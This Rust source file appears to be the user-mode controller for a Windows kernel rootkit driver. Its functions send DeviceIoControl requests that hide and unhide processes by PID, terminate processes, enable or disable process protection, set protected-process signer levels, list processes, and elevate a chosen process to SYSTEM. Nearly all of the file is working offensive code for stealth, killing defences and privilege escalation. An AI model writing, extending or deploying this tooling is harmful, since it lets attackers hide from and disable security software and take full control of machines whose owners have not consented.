use {
    log::*,
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    windows_sys::Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::IO::DeviceIoControl,
    },
    crate::{
        utils::open_driver, 
        cli::{Options, PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE}
    },
    shared::{
        structs::{
            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo, 
            ProcessSignature, TargetProcess,
        },
        vars::MAX_PIDS,
    },
};

pub fn hide_unhide_process(pid: Option<&u32>, ioctl_code: u32, enable: bool) {
    debug!("Attempting to open the driver for hide/unhide operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(pid_value) = pid {
        debug!("Preparing structure for pid: {}", pid_value);
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = ProcessInfoHide {
            enable,
            pid,
        };

        debug!("Sending DeviceIoControl command to {} process", if enable { "hide" } else { "unhide" });
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process as *mut _ as *mut c_void,
                size_of::<ProcessInfoHide>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!(
                "DeviceIoControl Failed with status: 0x{:08X}",
                unsafe { GetLastError() }
            );
        } else {
            info!("Process with PID {} successfully {}hidden", pid, if enable { "" } else { "un" });
        }
    } else {
        error!("PID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}

pub fn terminate_process(pid: Option<&u32>, ioctl_code: u32) {
    debug!("Attempting to open the driver for terminate operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(pid_value) = pid {
        debug!("Preparing structure for pid: {}", pid_value);
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = TargetProcess { pid };

        debug!("Sending DeviceIoControl command to terminate process");
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process as *mut _ as *mut c_void,
                size_of::<TargetProcess>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Process with PID {} terminated successfully", pid);
        }
    } else {
        error!("PID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}

#[cfg(not(feature = "mapper"))]
pub fn protection_process(pid: Option<&u32>, ioctl_code: u32, enable: bool) {
    debug!("Attempting to open the driver for protection operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(pid_value) = pid {
        debug!("Preparing structure for pid: {}", pid_value);
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = shared::structs::ProcessProtection { pid, enable };

        debug!("Sending DeviceIoControl command to {} protection", if enable { "enable" } else { "disable" });
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process as *mut _ as *mut c_void,
                size_of::<shared::structs::ProcessProtection>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() }
            );
        } else {
            info!("Process with PID {} {} protection", pid, if enable { "enabled" } else { "disabled" });
        }
    } else {
        error!("PID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}

pub fn enumerate_process(ioctl_code: u32, option: &Options) {
    debug!("Attempting to open the driver for process enumeration");
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_process: [ProcessListInfo; MAX_PIDS] = unsafe { std::mem::zeroed() };
    let mut enumeration_input = EnumerateInfoInput {
        options: option.to_shared(),
    };
    let mut return_buffer = 0;

    debug!("Sending DeviceIoControl command to enumerate processes");
    let status = unsafe {
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut enumeration_input as *mut _ as *mut c_void,
            size_of::<EnumerateInfoInput>() as u32,
            info_process.as_mut_ptr() as *mut _,
            (info_process.len() * size_of::<ProcessListInfo>()) as u32,
            &mut return_buffer,
            null_mut(),
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
    } else {
        let total_process = return_buffer as usize / size_of::<ProcessListInfo>();
        info!("Total Processes: {}", total_process);
        println!("Listing Processes:");
        println!("");
        for i in 0..total_process {
            if info_process[i].pids > 0 {
                println!("[{}] {}", i, info_process[i].pids);
            }
        }
        println!("");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}


pub fn signature_process(
    pid: Option<&u32>,
    ioctl_code: u32,
    sg: &PS_PROTECTED_SIGNER,
    tp: &PS_PROTECTED_TYPE,
) {
    debug!("Attempting to open the driver for signature operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(pid_value) = pid {
        debug!("Preparing structure for pid: {}", pid_value);
        let mut return_buffer = 0;
        let sg = *sg as usize;
        let tp = *tp as usize;
        let pid = *pid_value as usize;
        let mut info_protection_process = ProcessSignature { pid, sg, tp };

        debug!("Sending DeviceIoControl command to apply signature protection");
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut info_protection_process as *mut _ as *mut c_void,
                size_of::<ProcessSignature>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!(
                "DeviceIoControl Failed With Status: 0x{:08X}",
                unsafe { GetLastError() }
            );
        } else {
            info!("Process with PID {} successfully protected", pid);
        }
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}

pub fn elevate_process(pid: Option<&u32>, ioctl_code: u32) {
    debug!("Attempting to open the driver for elevation operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(pid_value) = pid {
        debug!("Preparing structure for pid: {}", pid_value);
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = TargetProcess { pid };

        debug!("Sending DeviceIoControl command to elevate process");
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process as *mut _ as *mut c_void,
                size_of::<TargetProcess>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!(
                "DeviceIoControl Failed With Status: 0x{:08X}",
                unsafe { GetLastError() }
            );
        } else {
            info!("Process with PID {} elevated to System", pid);
        }
    } else {
        error!("PID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    }
}
